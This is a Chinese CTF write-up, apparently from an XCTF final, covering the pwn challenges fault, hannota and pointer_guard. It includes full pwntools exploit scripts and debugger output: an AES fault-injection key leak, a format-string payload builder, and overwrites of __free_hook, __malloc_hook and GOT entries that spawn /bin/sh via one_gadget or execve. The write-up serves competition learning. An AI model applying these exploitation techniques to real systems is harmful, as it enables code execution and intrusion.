感谢**r3kapig**的大佬们带来的精彩比赛

# fault

看了流量才找到洞。。攻击方法也是从流量里看出来的（没看懂

加密函数：

```c
 add_round_key((__int64)v15, v9, 0);
  for ( k = 1; k < round; ++k )
  {
    if ( k == 8 )
      v15[v7] ^= v8;	//!!!
    subBytes((__int64)v15);
    shiftRows((__int64)v15);
    mixColums((__int64)v15);
    add_round_key((__int64)v15, v9, k);
  }
  subBytes((__int64)v15);
  shiftRows((__int64)v15);
  add_round_key((__int64)v15, v9, round);
```

可以看到这里有个`v15[v7] ^= v8`,`v7`和`v8`是传进来的参数，然而在解密函数里可以覆盖到这两个的值，于是可以利用这个把

```c
────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 RAX  0x20
 RBX  0x7fff5b1ae920 ◂— 0x8362000000020 /* ' ' */
 RCX  0xc0
 RDX  0x7fff5b1ae910 ◂— 0xaa63df0da959514d
 RDI  0x7fff5b1ae910 ◂— 0xaa63df0da959514d
 RSI  0x20
 R8   0x20
 R9   0x10
 R10  0x0
 R11  0x10
 R12  0x0
 R13  0x7fff5b1aeac0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff5b1ae970 —▸ 0x7fff5b1ae9c0 —▸ 0x7fff5b1ae9e0 —▸ 0x56105a45f340 ◂— push   r15
 RSP  0x7fff5b1ae910 ◂— 0xaa63df0da959514d
 RIP  0x56105a45f004 ◂— mov    byte ptr [rdx + rax], cl
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x56105a45f004    mov    byte ptr [rdx + rax], cl
   0x56105a45f007    mov    rax, qword ptr [rbp - 0x20]
   0x56105a45f00b    mov    rdi, rax
   0x56105a45f00e    call   0x56105a45e886
 
   0x56105a45f013    mov    rax, qword ptr [rbp - 0x20]
   0x56105a45f017    mov    rdi, rax
   0x56105a45f01a    call   0x56105a45e6b5
 
   0x56105a45f01f    mov    rax, qword ptr [rbp - 0x20]
   0x56105a45f023    mov    rdi, rax
   0x56105a45f026    call   0x56105a45e4b9
 
   0x56105a45f02b    movzx  edx, byte ptr [rbp - 0x29]
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ rdx rdi rsp  0x7fff5b1ae910 ◂— 0xaa63df0da959514d
01:0008│              0x7fff5b1ae918 ◂— 0x62bfb8152eb4f9cb
02:0010│ rbx          0x7fff5b1ae920 ◂— 0x8362000000020 /* ' ' */
03:0018│              0x7fff5b1ae928 —▸ 0x56105acb10b0 ◂— 0xb9a433d31f71aaa1
04:0020│              0x7fff5b1ae930 —▸ 0x56105a6613e0 ◂— 0xfcca81e5fb28c9b3   !!!!
05:0028│              0x7fff5b1ae938 —▸ 0x56105a6613d0 ◂— 0x34b1fca7a4f6bb23
06:0030│              0x7fff5b1ae940 ◂— 0x80404ff5b1ae970

```

 我标感叹号的那个地址指向`key`，后续的操作会把`key`值修改，最后还会把加密后的内容输出，输出的内容和`key`是一样的，这样就拿到了`key`了，但是要加密一样的字符串两次才可以，对密码学这个不是很熟悉，误打误撞吧，我太菜了 

```pytho
from pwn import *

context.arch='amd64'
def cmd(command):
    p.recvuntil(">",timeout=0.5)
    p.sendline(command)

def main(host,port=9999):
    global p
    if host:
        p = remote(host,port)
    else:
        p = process("./origin_fault")
        gdb.attach(p)
        # debug(0x0000000000003004)
    cmd('e')
    p.sendline("00"*0x10)
    cmd('e')
    p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
    cmd('d')
    payload1 = "5658a9ced4f5415d3e85e2e879d464405658a9ced4f5415d3e85e2e879d46440"
    payload2 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    p.sendline(payload1)
    p.sendline(payload2)

    cmd('e')
    p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
    p.recvuntil("e:encryp",drop=True)
    p.recvuntil(">")
    key = p.recvuntil("e:encryp",drop=True)
    info(key)
    cmd('s')
    p.sendline(key)
    flag = p.recv(0x3c,timeout=0.5)
    info(flag)
    p.interactive()

if __name__ == "__main__":
    main(args['REMOTE'])
```

# hannota

第二天说没有流量了。。。。。其实内心是有点慌的

只找到了两个漏洞

一个是`login`函数的堆溢出

```c
 v14 = __readfsqword(0x28u);
  src = 0LL;
  printf("please enter user token length : ");
  size = get_int();
  if ( size <= 0xFF )
  {
    printf("please enter user token: ");
    token = malloc(size);
    read_n(token, 0x100uLL);
    strcpy(dest, ROOM_PATH);
    n = strlen(dest);
```
另一个是`play from console`的`show`有个格式化字符串

```c
unsigned __int64 sub_243B()
{
  char buf; // [rsp+10h] [rbp-110h]
  unsigned __int64 v2; // [rsp+118h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("We will receive input from the terminal");
  printf("E.g :");
  read(0, &buf, 0x100uLL);
  printf(&buf, &buf);
  return __readfsqword(0x28u) ^ v2;
}
```
我用的是这里的格式化字符串，一开始修的时候把`printf`改成了`puts`，`check`没过，改成了`printf("%s",buf);`,还是没过，赛后问了阿鹏师傅，应该改为`write(1,buf,strlen(buf));`这样的，orz

格式化字符串的`exp`为

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">>> ",timeout=0.5)
	p.sendline(str(command))

def fmtstr(offset, addr, data, written):
	cnt = 0
	payload = ''
	address = ''
	for x in data:
		cur = ord(x)
		if cur >= written&0xff:
			to_add = cur - (written&0xff)
		else:
			to_add = 0x100 + cur - (written&0xff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%{}$hhn".format(offset+cnt+len(data)*2)
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+cnt)
		cnt+=1
	return payload + address

def ca(tl,t,nl,n,pl,pa):
	cmd(1)
	p.recvuntil("please enter user token length : ")
	p.sendline(str(tl))
	p.recvuntil("please enter user token: ")
	p.sendline(t)
	p.recvuntil("please enter user name length : ")
	p.sendline(str(nl))
	p.recvuntil("please enter user name: ")
	p.sendline(n)
	p.recvuntil("please enter user password length : ")
	p.sendline(str(pl))
	p.recvuntil("please enter user password: ")
	p.sendline(pa)
def login(tl,t,pl,pa):
	cmd(0)
	p.recvuntil("please enter user token length : ")
	p.sendline(str(tl))
	p.recvuntil("please enter user token: ")
	p.sendline(t)
	p.recvuntil("please enter user password length : ")
	p.sendline(str(pl))
	p.recvuntil("please enter user password : ")
	p.sendline(pa)
	
def add_pl(type):
	cmd(0)
	cmd(type)
def show(idx):
	cmd(2)
	p.recvuntil("index : ")
	p.sendline(str(idx))
	
def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./hannota")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		# gdb.attach(p)
		debug(0x00000000000024A1)
	ca(0x20,"AA",0x20,"AA",0x20,"AA")
	ca(0x20,"AA",0x20,"AA",0x20,"AA")
	login(0x20,"AA",0x20,"AA")
	
	add_pl(0)
	show(0)
	p.recvuntil("E.g :")
	p.sendline("%p%p-%p-%p-%p-%p-%p%p%p%p%p*%p*")
	
	p.recvuntil('-')
	libc.address = int(p.recvuntil("-",drop=True),16)-0x110081
	info("libc : " + hex(libc.address))
	p.recvuntil('*')
	stack = int(p.recvuntil("*",drop=True),16)
	info("stack : " + hex(stack))
	ret_addr = stack+0x8
	payload = fmtstr(8,ret_addr,p64(libc.address+0x4f2c5)[:6],0)
	show(0)
	p.recvuntil("E.g :")
	p.send(payload)
	
	sleep(0.1)
	p.sendline("cat flag")
	p.recv(timeout=0.5)
	flag = p.recvuntil("\n",timeout=0.5)
	info(flag)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])
	
```

# pointer_guard

逐渐变难的一题

- 一开始5次地址写，1次`libc`里的任意函数`call`，参数还是可控的，那自然就`system("/bin/sh")`和`execve("/bin/sh",0,0)`了

```c
from pwn import *

context.arch='amd64'
def cmd(command):
	p.recvuntil(">",timeout=0.5)
	p.sendline(command)
	
def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		gdb.attach(p)
		# debug(0x0000000000000A69)
	
	p.recvuntil("binary_base=")
	elf.address = int(p.recvuntil("\n",drop=True),16)
	info("elf : " + hex(elf.address))
	
	p.recvuntil("libc_base=")
	libc.address = int(p.recvuntil("\n",drop=True),16)
	info("libc : " + hex(libc.address))
	
	p.recvuntil("stack_base=")
	stack = int(p.recvuntil("\n",drop=True),16)
	info("stack : " + hex(stack))
	
	for i in range(4):
		p.recvuntil("Addr:")
		p.sendline(str(stack))
		p.recvuntil("Value:")
		p.sendline(str(1))
	p.recvuntil("Addr:")
	p.sendline(str(elf.address+0x203210))
	p.recvuntil("Value:")
	p.sendline(str(u64('/bin/sh\x00')))
	p.recvuntil("Trigger!")
	# system
	# p.sendline("system")
	# p.sendline("1")
	# p.sendline(str(stack+0x54))
	# execve
	p.sendline("execve")
	p.sendline("3")
	p.sendline(str(stack+0x54))
	p.sendline("0")
	p.sendline("0")
	p.sendline("cat flag")
	p.recv(timeout=0.5)
	flag = p.recvuntil("\n",timeout=0.5)
	info(flag)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./pwn",checksec=False)
	main(args['REMOTE'])
```

- 然后变成了一次任意地址写，一次`libc`任意函数`call`，但是参数不可控，那就写那些`hook`吧，`__free_hook`,`__malloc_hook`,`__memalign_hook`,`__realloc_hook`都试一试

这里贴个`__free_hook`的，其它的类似

```python
	p.recvuntil("Addr:")
	p.sendline(str(libc.symbols["__free_hook"]))
	p.recvuntil("Value:")
	p.sendline(str(libc.address+0x10a38c))
	p.recvuntil("Trigger!")
	p.sendline("free")
	p.sendline("0\x00"+"\x00"*90)
	p.sendline("cat flag")
	p.recv(timeout=0.5)
	flag = p.recvuntil("\n",timeout=0.5)
	info(flag)
```

- 然后是两次地址写

```
  for ( i = 0; (unsigned __int64)i < 2; ++i )
  {
    puts("Addr:");
    v3 = (_QWORD *)sub_DB1();
    puts("Value:");
    v4 = sub_DB1();
    sub_1498(v3, v4);
  }
  if ( !dlopen("libc.so.6", 1) )
  {
    v5 = dlerror();
    fprintf(stderr, "%s\n", v5);
    exit(1);
  }
```

因为`dlopen`会调用`malloc`函数，所以就修改`__malloc_hook`和`__realloc_hook`来`getshell`

```python
	p.recvuntil("Addr:")
	p.sendline(str(libc.symbols["__realloc_hook"]))
	p.recvuntil("Value:")
	p.sendline(str(libc.address+0x10a38c))
	p.recvuntil("Addr:")
	p.sendline(str(libc.symbols["__malloc_hook"]))
	p.recvuntil("Value:")
	p.sendline(str(libc.symbols["realloc"]+8))
```

- 最后只有一次地址写了

```
  for ( i = 0; (unsigned __int64)i < 1; ++i )
  {
    puts("Addr:");
    v3 = (_QWORD *)sub_DB1();
    puts("Value:");
    v4 = sub_DB1();
    sub_1498(v3, v4);
  }
  if ( !dlopen("libc.so.6", 1) )
  {
    v5 = dlerror();
    fprintf(stderr, "%s\n", v5);
    exit(1);
  }
```

我在`_dlerror_run`里找到了`call   _dl_catch_error@plt`

```asm
   0x7ff6fbcf6726 <_dlerror_run+86>     lea    rdi, [rbx + 0x10]
   0x7ff6fbcf672a <_dlerror_run+90>     mov    r8, r12
   0x7ff6fbcf672d <_dlerror_run+93>     mov    rcx, rbp
 ► 0x7ff6fbcf6730 <_dlerror_run+96>     call   _dl_catch_error@plt <0x7ff6fbcf5d90>
        rdi: 0x7ff6fbef80f0 (last_result+16) ◂— 0x0
        rsi: 0x7ff6fbef80f8 (last_result+24) ◂— 0x0
        rdx: 0x7ff6fbef80e8 (last_result+8) ◂— 0x0
        rcx: 0x7ff6fbcf5f40 (dlopen_doit) ◂— push   rbx

```

既然是`plt`的话，那就可以修改`GOT`表来劫持流程了

```asm
► 0x7ff6fbcf5d90 <_dl_catch_error@plt>       jmp    qword ptr [rip + 0x2022a2] <0x7ff6fbef8038>
 
   0x7ff6fbcf5d96 <_dl_catch_error@plt+6>     push   4
   0x7ff6fbcf5d9b <_dl_catch_error@plt+11>    jmp    0x7ff6fbcf5d40
    ↓
   0x7ff6fbcf5d40                             push   qword ptr [rip + 0x2022c2] <0x7ff6fbef8008>
   0x7ff6fbcf5d46                             jmp    qword ptr [rip + 0x2022c4] <0x7ff6fba0e38c>

pwndbg> telescope 0x5f4010+0x7f3cf530b000
00:0000│   0x7f3cf58ff010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7f3cf5917750 (_dl_runtime_resolve_xsavec)

```

可以看到有两处地方都用到了`GOT`表，所以都试一试改为`one_gadget`，结果本地都不行，但是打远程的时候通了,打通的是把`_dl_runtime_resolve_xsavec`的`GOT`改为`one_gadget`,这运气没谁了，晚上回去的时候又试了下本地，居然又可以了。。。


```python
	p.recvuntil("Addr:")
	p.sendline(str(libc.address+0x5f4010))
	p.recvuntil("Value:")
	p.sendline(str(libc.address+0x10a38c))
```

# tnj

这题的话还是看[丁佬](https://github.com/Escapingbug/xctf-2019-final-tnj)的`github`，膜丁佬

